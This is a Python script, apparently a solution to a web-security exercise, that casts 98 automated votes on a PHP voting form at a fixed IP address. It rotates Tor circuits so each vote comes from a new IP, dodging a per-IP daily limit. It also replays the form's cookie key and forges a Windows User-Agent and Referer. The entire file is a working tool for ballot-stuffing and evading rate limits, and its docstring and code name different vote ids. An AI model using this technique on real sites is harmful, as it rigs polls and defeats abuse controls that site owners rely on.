#!/usr/bin/python3
import requests
from stem import Signal
from stem.control import Controller
import time
"""level_4 module

    Votes 98 times (hopefully) for id 2529 on level_3 of project hodor
    Voting requires to send the value from a cookie to work
    AND voting needs to come from a Windows machine
    AND each IP address is limited to 1 vote/day
    (so each vote needs to come from a different IP)

    NOTE: this script needs sudo priviledge to run (to control Tor)
    """
# Target URL
url = "http://158.69.76.135/level4.php"

# List of proxies (we're using Tor so the proxies are all localhost)
proxies = {
    'http': 'socks5://127.0.0.1:9050',
    'https': 'socks5://127.0.0.1:9050'
}

failed = 0
success = 0
total = 98

# Start a session
session = requests.Session()

# Loop and pray
for i in range(total):
    # Ask Tor for a new circuit
    with Controller.from_port(port=9051) as c:
        c.authenticate()
        c.signal(Signal.NEWNYM)
    # Tor needs time to establish a circuit, so we take a 5 second break
    time.sleep(5)

    # Request the form page through Tor and fetch the cookie
    res = session.get(url, proxies=proxies)
    dict = session.cookies.get_dict()

    # Modify User-Agent with a Windows signature
    headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
               AppleWebKit/537.36 (KHTML, like Gecko) \
               Chrome/87.0.4280.88 Safari/537.36",
               'Referer': url}

    # Prepare payload of the POST request
    data = {'id': 9999,
            'key': dict['HoldTheDoor'],
            'holdthedoor': 'Envoyer'}

    # Lick the stamp (with someone else's saliva) and SEND IT (through Tor)
    post = session.post(url, data=data, headers=headers, proxies=proxies)

    # Print stuff after each request (incl. our Tor public IP)
    print("Request #{:d}".format(i), end=' ')
    print("Key: {:s}".format(dict['HoldTheDoor']), end=' ')
    print("IP: "+requests.get('https://api.ipify.org', proxies=proxies).text,
          end=' ')
    if post and "today" not in post.text:
        print("Request success")
        success += 1
    else:
        print("Request fail")
        failed += 1
    # Clear session cookies
    session.cookies.clear()

# Print stuff after all requests are done
print("{:d} requests sent".format(total))
print("{:d} requests succeded".format(success))
print("{:d} requests failed".format(failed))
